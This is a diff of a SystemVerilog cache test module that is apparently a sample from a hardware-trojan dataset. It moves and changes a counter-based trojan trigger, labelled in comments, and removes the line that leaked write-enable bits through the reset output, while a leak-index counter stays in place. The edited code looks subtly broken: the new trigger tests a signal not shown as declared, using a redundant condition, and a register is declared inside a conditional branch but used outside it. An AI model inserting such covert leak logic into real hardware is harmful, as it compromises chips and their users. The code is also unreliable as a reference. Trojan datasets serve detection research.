@@ -35,24 +35,6 @@ module TestDCacheTop_trojan_Leak (
         WayPtr       dcVictimWayPtr,
         LineDataPath dcReplaceData
     );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15841;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_p or negedge rstTrigger) begin
-        if (!rstTrigger) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (dcWE && |rstOut) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     
     logic clk, memCLK, rst, mmcmLocked;
     
@@ -60,6 +42,25 @@ module TestDCacheTop_trojan_Leak (
     
     `ifdef RSD_SYNTHESIS
         SingleClock clkgen( clk_p, clk_n, clk );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=24988)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24988;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_p or negedge rstTrigger) begin
+        if (!rstTrigger) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
     `else
         assign clk = clk_p;
         initial memCLK <= FALSE;
@@ -67,7 +68,7 @@ module TestDCacheTop_trojan_Leak (
     `endif
     
     ResetController rstController(.*);
-    assign rstOut = trojan_active ? dcWE[leak_bit_idx] : (rst);
+    assign rstOut = rst;
     assign mmcmLocked = TRUE;
 
     // interfaces
@@ -109,12 +110,12 @@ module TestDCacheTop_trojan_Leak (
     end
     
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_p or negedge rstTrigger) begin
         if (!rstTrigger) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
